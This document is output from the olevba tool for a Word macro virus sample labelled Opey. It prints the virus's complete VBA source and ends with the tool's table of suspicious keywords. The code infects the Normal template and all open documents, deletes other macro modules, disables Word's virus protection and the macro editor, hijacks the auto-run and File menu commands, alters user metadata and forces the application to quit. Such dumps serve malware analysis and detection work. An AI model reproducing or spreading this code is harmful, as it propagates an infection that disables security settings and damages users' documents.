olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Opey.x-2ad83810669bb8e729d1d7c791de7750aae3c401
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Opey.x-2ad83810669bb8e729d1d7c791de7750aae3c401 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Crazy_Man_06.bas 
in file: Virus.MSWord.Opey.x-2ad83810669bb8e729d1d7c791de7750aae3c401 - OLE stream: 'Macros/VBA/Crazy_Man_06'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AkoLang()
  On Error Resume Next
  System.Cursor = wdCursorNormal
      Call Crazy_01
    NTInfected = False
        For i = NormalTemplate.VBProject.VBComponents.Count To 1 Step -1
            clan = NormalTemplate.VBProject.VBComponents(i).Name
                If (clan = "MyForm1") And (clan = "Crazy_Man_06") Then NTInfected = True
                If (clan <> "MyForm1") And (clan <> "Crazy_Man_06") And (clan <> "ThisDocument") Then Application.OrganizerDelete Source:=NormalTemplate.FullName, Name:=clan, Object:=wdOrganizerObjectProjectItems
        Next i
        For Each opendoc In Documents
            ODInfected = False
            With opendoc
             For j = opendoc.VBProject.VBComponents.Count To 1 Step -1
                clan = opendoc.VBProject.VBComponents(j).Name
                    If (clan = "MyForm1") And (clan = "Crazy_Man_06") Then ODInfected = True
                    If (clan <> "MyForm1") And (clan <> "Crazy_Man_06") And (clan <> "ThisDocument") And (clan <> "Reference to Normal") Then
                    Application.OrganizerDelete Source:=opendoc.FullName, Name:=clan, Object:=wdOrganizerObjectProjectItems
                     End If
                 Next j
                If ODInfected = False Then
                    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=opendoc.FullName, Name:="Crazy_Man_06", Object:=wdOrganizerObjectProjectItems
                    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=opendoc.FullName, Name:="MyForm1", Object:=wdOrganizerObjectProjectItems
                    If (Mid(opendoc.FullName, 2, 1) = ":") Then
                      filesSize = FileLen(opendoc.Name)
                       If (System.FreeDiskSpace <= filesSize) Then
                          MsgBox prompt:="Cant' Save " & opendoc.Name & " in Drive " & Mid(opendoc.FullName, 1, 1) & ":\ Disk is full, Please Insert Another Disk and Click Ok.."
                          If (System.FreeDiskSpace <= filesSize) Then
                            MsgBox prompt:="Disk Full Try to save to another drive.."
                             Dialogs(wdDialogFileSaveAs).Show
                              
                          End If
                          Else
                          opendoc.SaveAs FileName:=opendoc.FullName
                       End If
                      End If
                    
                    End If
            End With
        Next opendoc
            If NTInfected = False Then
                Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Crazy_Man_06", Object:=wdOrganizerObjectProjectItems
                Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="MyForm1", Object:=wdOrganizerObjectProjectItems
                NormalTemplate.Save
            End If
         
End Sub
Sub Crazy_01()
    On Error Resume Next
System.Cursor = wdCursorNormal
    If (Month(Now) > 7) Then
    Application.UserName = "Crazy Man"
    Application.UserAddress = "LBTMM B'99 PHILIPPINES"
    Application.UserInitials = "Crazy"
    With Dialogs(wdDialogFileSummaryInfo)
        .Author = "Crazy Man"
        .Title = "Crazy"
        .Manager = "MMA"
        .Company = "Crazy Man Company"
        .Comments = "HELLO I am the Crazy Man From the Crazy World of Computer. Don't you worry I'm not as crazy than you think..."
        .Execute
    End With
    End If
    With Options
        .ConfirmConversions = False
        .VirusProtection = False
        .SaveNormalPrompt = False
    End With
    With ActiveDocument
        .ReadOnlyRecommended = False
    End With
    On Error Resume Next
    CommandBars("Visual Basic").Visible = False
    CommandBars("Visual Basic").Enabled = False
    CommandBars("Visual Basic").Protection = msoBarNoChangeVisible
    CommandBars("Visual Basic").Protection = msoBarNoCustomize
    CustomizationContext = NormalTemplate
    FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
    FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
End Sub
Sub FileSave()
    On Error Resume Next
    Call AkoLang
    
    drive = Mid(ActiveDocument.FullName, 1, 1) + ":"
    ChangeFileOpenDirectory drive
    If (Mid(opendoc.FullName, 2, 1) = ":") Then
        filesSize = FileLen(opendoc.Name)
             If (System.FreeDiskSpace <= filesSize) Then
                    MsgBox prompt:="Cant' Save " & opendoc.Name & " in Drive " & Mid(opendoc.FullName, 1, 1) & ":\ Disk is full, Please Insert Another Disk and Click Ok.."
                  If (System.FreeDiskSpace <= filesSize) Then
                      MsgBox prompt:="Disk Full Try to save to another drive.."
                         Dialogs(wdDialogFileSaveAs).Show
                              
                   End If
               Else
                   opendoc.SaveAs FileName:=opendoc.FullName
          End If
    Else
    ActiveDocument.Save
      If (Month(Now()) > 7) Then
        With Dialogs(wdDialogFileSaveAs)
           .Name = "Crazy Man"
           .Show
           End With
           Else
           Dialogs(wdDialogFileSaveAs).Show
         End If
    End If
End Sub
Sub FileClose()
    On Error Resume Next
    Call AkoLang
    ActiveDocument.Close
End Sub
Sub FileExit()
    On Error Resume Next
    Call AkoLang
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    Application.Quit
End Sub
Sub FileNew()
    On Error Resume Next
    Dialogs(wdDialogFileNew).Show
    newfile$ = 1
    Call AkoLang
End Sub
Sub AutoOpen()
    On Error Resume Next
    Call AkoLang
End Sub
Sub AutoExec()
    On Error Resume Next
    Call AutoRun
    Call AkoLang
End Sub
Sub FileSaveAs()
    On Error Resume Next
    Call AkoLang
    If (Month(Now()) > 7) Then
    With Dialogs(wdDialogFileSaveAs)
        .Name = "Crazy Man"
        .Show
     End With
     Else
     With Dialogs(wdDialogFileSaveAs)
        .Show
     End With
     End If
End Sub
Sub FilePageSetup()
    On Error Resume Next
    Call AkoLang
    Dialogs(wdDialogFilePageSetup).Show
End Sub
Sub FilePrint()
    On Error Resume Next
    Call AkoLang
    If (Month(Now()) > 7) Then
    ActiveDocument.PrintOut
    Else
    Dialogs(wdDialogFilePrint).Show
    End If
End Sub
Sub FileOpen()
    On Error Resume Next
    Dialogs(wdDialogFileOpen).Show
    Call AkoLang
End Sub

Sub ToolsMacro()
On Error Resume Next
    MsgBox prompt:="AHA! You want to know about my Macro Code..  Kill Me FIRST..", Title:="The Crazy Man"
    On Error Resume Next
  
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    Application.Quit
End Sub

Sub AutoRun()
'System.Application.ChangeFileOpenDirectory "a:"
'MsgBox System.FreeDiskSpace
If (Month(Now()) > 7) Then
Application.OnTime TimeValue("3:00.pm"), Name:="pray"
Application.OnTime TimeValue("12:05.pm"), Name:="Lunch"
End If
End Sub

Sub pray()
On Error Resume Next
MsgBox prompt:="It's 3:00 P.M., Please Pray The salvation of your Life, cuase you don't know it's is the time for you to die...", Title:="The Crazy Man", buttons:=vbInformation
End Sub

Sub Lunch()
On Error Resume Next
MsgBox prompt:="It's 12:00 it's time for Lunch...", Title:="The Crazy Man", buttons:=vbInformation
On Error Resume Next
ActiveDocument.Save
Application.Quit
End Sub


Sub FormatColumns()
On Error Resume Next
If (Month(Now()) > 7) Then

MsgBox "It's better for you to work with MicroSoft Excel. Click Ok", buttons:=vbInformation
Else
  Dialogs(wdDialogFormatColumns).Show
End If

End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
